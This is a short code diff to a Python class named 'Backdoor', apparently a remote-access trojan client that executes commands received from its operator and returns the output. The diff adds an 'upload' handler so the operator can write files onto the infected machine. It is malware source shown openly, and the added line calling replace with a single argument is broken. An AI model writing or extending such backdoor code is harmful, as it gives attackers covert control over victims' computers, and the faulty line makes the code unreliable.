@@ -108,6 +108,10 @@ class Backdoor:
 					else:
 						self.reliable_send("[-] Check your command")
 
+				elif command.split()[0] == "upload":
+					file = command.replace("upload").strip()
+					self.write_file(file)
+
 				else:
 					res = self.execute_system_command(command)
 					self.reliable_send(res)
